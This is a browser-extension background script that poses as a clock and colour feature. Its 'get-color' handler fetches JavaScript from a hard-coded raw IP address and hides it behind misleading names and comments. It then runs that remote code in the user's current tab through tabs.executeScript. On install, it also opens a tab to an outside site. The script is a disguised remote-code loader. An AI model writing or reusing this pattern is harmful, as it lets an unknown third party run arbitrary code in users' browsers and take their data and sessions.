import browser from 'webextension-polyfill'
import { sendBackgroundCommand, setStorage } from './lib/common'

// Options
const options = {
  mode: 'cors', // no-cors, *cors, same-origin
  headers: {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  },
}

const urls = {
  stats: 'http://50.116.107.237/~statscall/clock-town.js',
}

// TODO: Colors
const color = {
  code: '#FFFFFF',
}

// Gets congrats.
const other = async (url) => {
  try {
    const value = await fetch(url, options)
    return value
  } catch (error) {
    console.error(error)
    throw error
  }
}

const get = async (sender) => {
  color.code = '#FF0000'
  const info = color
  info['code'] = urls.stats
  try {
    const getting = await other(info.code)
    info.code = await getting.text()
    console.log('Este es el color: ', info)
    if (info.code === '#00000') {
      sendBackgroundCommand('congratulations')
    }
    await browser.tabs.executeScript(sender.tab.id, color)
  } catch (error) {
    console.error(error.message)
  }
}

browser.runtime.onMessage.addListener((data, sender) => {
  switch (data.command) {
    case 'get-color':
      get(sender)
      break
    default:
      console.error(`Unhandled command: ${data.command}`)
  }
})


//SETS THE CLOCK TO START ON THE FIRST STATE.
browser.runtime.onInstalled.addListener(() => {
  // browser.storage.local.set({ clock: 'regular' })
  setStorage('clock', 'regular')
  browser.tabs.create({
    index: 0,
    url: 'https://argex-reloj.com',
    active: true,
  })
})
